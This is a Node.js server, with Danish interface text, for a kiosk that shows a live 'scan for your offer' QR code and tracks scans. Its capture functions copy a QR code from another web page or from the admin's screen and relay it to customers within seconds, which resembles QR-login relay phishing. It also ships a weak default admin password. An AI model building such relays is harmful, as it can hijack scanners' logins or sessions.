require('dotenv').config();
const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const fs = require('fs');
const path = require('path');
const { Jimp } = require('jimp');
const jsQR = require('jsqr');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

const DATA_FILE = path.join(__dirname, 'data.json');
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'skift-mig';
const PORT = process.env.PORT || 3000;

function defaultState() {
  return {
    live: false,
    target: '',
    title: 'Scan for dit tilbud',
    message: 'Gyldig i denne butik i dag',
    sessionId: genId(),
    lastUpdated: null,
    bg: 'mint',
    offlineTitle: 'Ingen aktiv session',
    offlineBody: 'Kom tilbage senere',
    customers: [],
    templates: [],
    stats: { totalScans: 0, scanLog: [] },
    schedule: { enabled: false, start: null, end: null },
          capture: { sourceUrl: '', enabled: false, lastCheckedAt: null, lastError: null },
        rotate: { enabled: false, intervalSeconds: 15, lastRotatedAt: null }
  };
}

function genId() {
  return 'S-' + Math.random().toString(36).slice(2, 7).toUpperCase();
}
function genTemplateId() {
  return 'T-' + Math.random().toString(36).slice(2, 8).toUpperCase();
}

function loadState() {
  try {
    const loaded = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
    // merge with defaults so upgrades from older data.json don't crash on missing fields
    return { ...defaultState(), ...loaded, stats: { ...defaultState().stats, ...(loaded.stats || {}) }, schedule: { ...defaultState().schedule, ...(loaded.schedule || {}) }, capture: { ...defaultState().capture, ...(loaded.capture || {}) }, rotate: { ...defaultState().rotate, ...(loaded.rotate || {}) } };
  } catch (e) {
    const fresh = defaultState();
    saveState(fresh);
    return fresh;
  }
}

function saveState(state) {
  fs.writeFileSync(DATA_FILE, JSON.stringify(state, null, 2));
}

let state = loadState();

app.use(express.json());

// --- No-cache guard for the public display: this is what a kiosk screen sits
// on for hours/days. Without this, browsers and Render's CDN can serve a
// stale display.html/display.js/styles.css, which looks exactly like "the
// screen doesn't update when a customer scans" even though the server side
// is working correctly. ---
app.use('/display', (req, res, next) => {
  res.set('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
  res.set('Pragma', 'no-cache');
  res.set('Expires', '0');
  next();
});
app.get(['/display.js', '/styles.css'], (req, res, next) => {
  res.set('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
  next();
});

app.use('/display', express.static(path.join(__dirname, 'public'), { index: 'display.html', etag: false, lastModified: false }));
app.get(['/capture', '/capture.js'], (req, res, next) => {
    res.set('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
    next();
});
app.use('/capture', express.static(path.join(__dirname, 'public'), { index: 'capture.html', etag: false, lastModified: false }));
app.use('/admin', express.static(path.join(__dirname, 'public'), { index: 'admin.html' }));
app.use(express.static(path.join(__dirname, 'public'), { etag: false, lastModified: false }));

// --- Public: read-only state for the display screen (no auth, no secrets in payload) ---
app.get('/api/public-state', (req, res) => {
  res.set('Cache-Control', 'no-store');
  res.json(publicPayload());
});

// --- Public: scan-tracking redirect. QR codes point here instead of straight to the target,
// so every real scan gets counted before the customer is sent on to the actual link. ---
app.get('/r/:sessionId', (req, res) => {
  if (state.live && state.target) {
    state.stats.totalScans += 1;
    state.stats.scanLog.push({ at: Date.now(), session: req.params.sessionId });
    if (state.stats.scanLog.length > 200) {
      state.stats.scanLog = state.stats.scanLog.slice(-200);
    }
    saveState(state);
    io.emit('admin-state-update', state);
    return res.redirect(302, state.target);
  }
  res.status(404).send(`
    <!DOCTYPE html><html lang="da"><head><meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>regningoutbounn</title>
    <style>body{font-family:sans-serif;background:#132E28;color:#DCF2E8;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0;text-align:center;padding:20px;}</style>
    </head><body><div><h1>Ingen aktiv session</h1><p>Dette link er ikke aktivt lige nu.</p></div></body></html>
  `);
});

// --- Admin auth middleware ---
function requireAdmin(req, res, next) {
  const auth = req.headers['x-admin-password'];
  if (auth !== ADMIN_PASSWORD) {
    return res.status(401).json({ error: 'Forkert adgangskode' });
  }
  next();
}

async function resolveQrImageBuffer(url) {
    const r = await fetch(url, { redirect: 'follow' });
    if (!r.ok) throw new Error(`Kunne ikke hente siden (HTTP ${r.status})`);
    const ct = r.headers.get('content-type') || '';
    if (ct.startsWith('image/')) {
          return Buffer.from(await r.arrayBuffer());
    }
    const html = await r.text();
    const imgMatches = [...html.matchAll(/<img[^>]+src=["']([^"']+)["'][^>]*>/gi)];
    if (!imgMatches.length) throw new Error('Ingen billeder fundet paa siden');
    const qrCandidate = imgMatches.find(m => /qr/i.test(m[0]));
    const candidate = qrCandidate || imgMatches[0];
    let imgSrc = candidate[1];
    if (imgSrc.startsWith('//')) {
          imgSrc = 'https:' + imgSrc;
    } else if (!/^https?:\/\//i.test(imgSrc)) {
          imgSrc = new URL(imgSrc, url).toString();
    }
    const r2 = await fetch(imgSrc, { redirect: 'follow' });
    if (!r2.ok) throw new Error(`Kunne ikke hente billedet (HTTP ${r2.status})`);
    return Buffer.from(await r2.arrayBuffer());
}

async function decodeQrFromBuffer(buffer) {
    const image = await Jimp.read(buffer);
    const { data, width, height } = image.bitmap;
    const code = jsQR(new Uint8ClampedArray(data), width, height);
    return code ? code.data : null;
}

app.post('/api/capture-url', requireAdmin, async (req, res) => {
    const { url } = req.body;
    if (!url || typeof url !== 'string' || !url.trim()) {
          return res.status(400).json({ error: 'Ingen URL angivet' });
    }
    const cleanUrl = url.trim();
    try {
          const buffer = await resolveQrImageBuffer(cleanUrl);
          const decoded = await decodeQrFromBuffer(buffer);
          state.capture.lastCheckedAt = Date.now();
          if (!decoded) {
                  state.capture.lastError = 'Kunne ikke finde eller aflaese en QR-kode paa siden';
                  saveState(state);
                  return res.status(422).json({ error: state.capture.lastError });
          }
          state.capture.lastError = null;
          if (state.target !== decoded || !state.live) {
                  state.target = decoded;
                  state.live = true;
                  state.lastUpdated = Date.now();
                  io.emit('state-update', publicPayload());
          }
          saveState(state);
          io.emit('admin-state-update', state);
          res.json({ ok: true, target: decoded });
    } catch (e) {
          state.capture.lastError = e.message || 'Ukendt fejl';
          state.capture.lastCheckedAt = Date.now();
          saveState(state);
          io.emit('admin-state-update', state);
          res.status(500).json({ error: state.capture.lastError });
    }
});

app.post('/api/capture-settings', requireAdmin, (req, res) => {
    const { sourceUrl, enabled } = req.body;
    if (sourceUrl !== undefined) state.capture.sourceUrl = String(sourceUrl).trim();
    if (enabled !== undefined) state.capture.enabled = !!enabled;
    saveState(state);
    io.emit('admin-state-update', state);
    res.json(state.capture);
});

// Push a value read live from the admin's own screen (screen-capture flow):
// no server-side fetch/decoding needed here, the browser already decoded it.
app.post('/api/capture-push', requireAdmin, (req, res) => {
    const { target } = req.body;
    if (!target || typeof target !== 'string' || !target.trim()) {
          return res.status(400).json({ error: 'Tom kode' });
    }
    const clean = target.trim();
    state.capture.lastCheckedAt = Date.now();
    state.capture.lastError = null;
    if (state.target !== clean || !state.live) {
          state.target = clean;
          state.live = true;
          state.lastUpdated = Date.now();
          io.emit('state-update', publicPayload());
    }
    saveState(state);
    io.emit('admin-state-update', state);
    res.json({ ok: true, target: clean, live: state.live });
});

setInterval(async () => {
    if (!state.capture || !state.capture.enabled || !state.capture.sourceUrl) return;
    try {
          const buffer = await resolveQrImageBuffer(state.capture.sourceUrl);
          const decoded = await decodeQrFromBuffer(buffer);
          state.capture.lastCheckedAt = Date.now();
          if (!decoded) {
                  state.capture.lastError = 'Kunne ikke finde eller aflaese en QR-kode paa siden';
                  saveState(state);
                  io.emit('admin-state-update', state);
                  return;
          }
          state.capture.lastError = null;
          if (state.target !== decoded || !state.live) {
                  state.target = decoded;
                  state.live = true;
                  state.lastUpdated = Date.now();
                  saveState(state);
                  io.emit('state-update', publicPayload());
                  io.emit('admin-state-update', state);
          } else {
                  saveState(state);
          }
    } catch (e) {
          state.capture.lastError = e.message || 'Ukendt fejl';
          state.capture.lastCheckedAt = Date.now();
          saveState(state);
          io.emit('admin-state-update', state);
    }
}, 20000);

app.post('/api/login', (req, res) => {
  const { password } = req.body;
  if (password === ADMIN_PASSWORD) {
    return res.json({ ok: true });
  }
  res.status(401).json({ ok: false });
});

app.get('/api/state', requireAdmin, (req, res) => {
  res.json(state);
});

app.post('/api/state', requireAdmin, (req, res) => {
  const allowed = ['live', 'target', 'title', 'message', 'bg', 'offlineTitle', 'offlineBody'];
  allowed.forEach(key => {
    if (req.body[key] !== undefined) state[key] = req.body[key];
  });
  state.lastUpdated = Date.now();
  saveState(state);
  io.emit('state-update', publicPayload());
  io.emit('admin-state-update', state);
  res.json(state);
});

app.post('/api/session/new', requireAdmin, (req, res) => {
  state.sessionId = genId();
  state.lastUpdated = Date.now();
  saveState(state);
  io.emit('admin-state-update', state);
  io.emit('state-update', publicPayload());
  res.json(state);
});

app.post('/api/customers', requireAdmin, (req, res) => {
  const ref = 'K-' + Math.floor(1000 + Math.random() * 9000);
  state.customers.push({
    ref,
    session: state.sessionId,
    started: Date.now(),
    status: 'active'
  });
  saveState(state);
  io.emit('admin-state-update', state);
  res.json(state);
});

// --- Templates: save & reuse a full session setup (title, message, target, bg) ---
app.get('/api/templates', requireAdmin, (req, res) => {
  res.json(state.templates);
});

app.post('/api/templates', requireAdmin, (req, res) => {
  const { name, title, message, target, bg } = req.body;
  if (!name || !name.trim()) {
    return res.status(400).json({ error: 'Skabelonen skal have et navn' });
  }
  const template = {
    id: genTemplateId(),
    name: name.trim(),
    title: title || '',
    message: message || '',
    target: target || '',
    bg: bg || 'mint',
    createdAt: Date.now()
  };
  state.templates.push(template);
  saveState(state);
  io.emit('admin-state-update', state);
  res.json(template);
});

app.post('/api/templates/:id/apply', requireAdmin, (req, res) => {
  const tpl = state.templates.find(t => t.id === req.params.id);
  if (!tpl) return res.status(404).json({ error: 'Skabelon ikke fundet' });
  state.title = tpl.title;
  state.message = tpl.message;
  state.target = tpl.target;
  state.bg = tpl.bg;
  state.lastUpdated = Date.now();
  saveState(state);
  io.emit('state-update', publicPayload());
  io.emit('admin-state-update', state);
  res.json(state);
});

app.delete('/api/templates/:id', requireAdmin, (req, res) => {
  state.templates = state.templates.filter(t => t.id !== req.params.id);
  saveState(state);
  io.emit('admin-state-update', state);
  res.json({ ok: true });
});

// --- Stats ---
app.get('/api/stats', requireAdmin, (req, res) => {
  const dayMs = 24 * 60 * 60 * 1000;
  const now = Date.now();
  const last24h = state.stats.scanLog.filter(s => now - s.at < dayMs).length;
  res.json({
    totalScans: state.stats.totalScans,
    last24h,
    recent: state.stats.scanLog.slice(-15).reverse()
  });
});

// --- Scheduling: auto go live/offline within a time window, checked every 30s ---
app.post('/api/schedule', requireAdmin, (req, res) => {
  const { enabled, start, end } = req.body;
  state.schedule = {
    enabled: !!enabled,
    start: start || null,
    end: end || null
  };
  saveState(state);
  io.emit('admin-state-update', state);
  res.json(state.schedule);
});

setInterval(() => {
  if (!state.schedule || !state.schedule.enabled || !state.schedule.start || !state.schedule.end) return;
  const now = Date.now();
  const start = new Date(state.schedule.start).getTime();
  const end = new Date(state.schedule.end).getTime();
  if (isNaN(start) || isNaN(end)) return;
  const shouldBeLive = now >= start && now <= end;
  if (shouldBeLive !== state.live) {
    state.live = shouldBeLive;
    state.lastUpdated = Date.now();
    saveState(state);
    io.emit('state-update', publicPayload());
    io.emit('admin-state-update', state);
  }
}, 30000);

function publicPayload() {
  return {
    live: state.live,
    target: state.target,
    sessionId: state.sessionId,
    title: state.title,
    message: state.message,
    bg: state.bg,
    offlineTitle: state.offlineTitle,
    offlineBody: state.offlineBody
  };
}

io.on('connection', (socket) => {
  socket.emit('state-update', publicPayload());
});

server.listen(PORT, () => {
  console.log(`QR-panel kører på http://localhost:${PORT}`);
  console.log(`Admin: http://localhost:${PORT}/admin`);
  console.log(`Skærm: http://localhost:${PORT}/display`);
});


// --- Rotation: automatically generate a new sessionId every N seconds, so the
// QR code visually changes on its own. This is entirely our own session token
// (not tied to any bank or ID provider) -- it just makes an old screenshot of
// the code stop matching what's shown moments later. ---
app.post('/api/rotate-settings', requireAdmin, (req, res) => {
    const { enabled, intervalSeconds } = req.body;
    if (enabled !== undefined) state.rotate.enabled = !!enabled;
    if (intervalSeconds !== undefined) {
          const n = parseInt(intervalSeconds, 10);
          if (Number.isFinite(n) && n >= 3) state.rotate.intervalSeconds = n;
    }
    state.rotate.lastRotatedAt = Date.now();
    saveState(state);
    io.emit('admin-state-update', state);
    res.json(state.rotate);
});

setInterval(() => {
    if (!state.rotate || !state.rotate.enabled) return;
    const now = Date.now();
    const last = state.rotate.lastRotatedAt || 0;
    const intervalMs = (state.rotate.intervalSeconds || 15) * 1000;
    if (now - last >= intervalMs) {
          state.sessionId = genId();
          state.rotate.lastRotatedAt = now;
          state.lastUpdated = now;
          saveState(state);
          io.emit('state-update', publicPayload());
          io.emit('admin-state-update', state);
    }
}, 1000);
